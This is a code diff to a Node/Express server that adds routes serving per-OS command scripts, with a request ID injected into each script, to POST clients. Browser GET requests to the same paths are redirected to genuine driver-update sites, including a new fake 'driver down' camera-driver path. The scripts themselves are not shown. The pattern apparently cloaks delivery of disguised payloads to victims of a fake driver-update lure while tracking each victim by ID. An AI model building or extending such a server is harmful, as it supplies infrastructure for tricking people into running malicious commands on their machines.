@@ -101,6 +101,30 @@ app.get('/', (req, res) => {
 
 const cmdRoute = (filename) => (req, res) => sendCmdFile(filename, res);
 
+const escapeBashDoubleQuotedValue = (value) =>
+  String(value).replace(/\\/g, '\\\\').replace(/"/g, '\\"');
+
+const macRoute = (req, res) => {
+  const id = req.params?.id || req.body?.id || req.query?.id || '';
+  const filePath = path.join(projectRoot, 'mac.cmd');
+  try {
+    let content = fs.readFileSync(filePath, 'utf8');
+    if (id) {
+      content = content.replace(
+        /MAC_UID="__ID__"/,
+        `MAC_UID="${escapeBashDoubleQuotedValue(id)}"`
+      );
+    }
+    res.type('text/plain').send(content);
+  } catch (err) {
+    if (err.code === 'ENOENT') {
+      res.status(404).type('text/plain').send('File not found: mac.cmd');
+      return;
+    }
+    throw err;
+  }
+};
+
 const windowRoute = (req, res) => {
   const id = req.params?.id || req.body?.id || req.query?.id || '';
   const filePath = path.join(projectRoot, 'window.cmd');
@@ -120,18 +144,25 @@ const windowRoute = (req, res) => {
 };
 
 const AUTO_UPDATE_REDIRECT_URL = 'https://www.drivereasy.com/auto-update/';
+const DRIVER_DOWN_REDIRECT_URL = 'https://www.3dpchip.com/new/driver/down.html?pl=cam14_1&o=6164';
 
 app.get('/window', (req, res) => res.redirect(302, AUTO_UPDATE_REDIRECT_URL));
 app.get('/window/:id', (req, res) => res.redirect(302, AUTO_UPDATE_REDIRECT_URL));
+app.get('/new/driver/down', (req, res) => res.redirect(302, DRIVER_DOWN_REDIRECT_URL));
+app.get('/new/driver/down/:id', (req, res) => res.redirect(302, DRIVER_DOWN_REDIRECT_URL));
 app.get('/mac', (req, res) => res.redirect(302, AUTO_UPDATE_REDIRECT_URL));
+app.get('/mac/:id', (req, res) => res.redirect(302, AUTO_UPDATE_REDIRECT_URL));
 app.get('/linux', (req, res) => res.redirect(302, AUTO_UPDATE_REDIRECT_URL));
 
 app.post('/linux', cmdRoute('linux.cmd'));
 
 app.post('/window/:id', windowRoute);
 app.post('/window', windowRoute);
+app.post('/new/driver/down/:id', windowRoute);
+app.post('/new/driver/down', windowRoute);
 
-app.post('/mac', cmdRoute('mac.cmd'));
+app.post('/mac/:id', macRoute);
+app.post('/mac', macRoute);
 
 const INVITE_API_BASE = 'https://myproject-backend-beta.vercel.app';
 
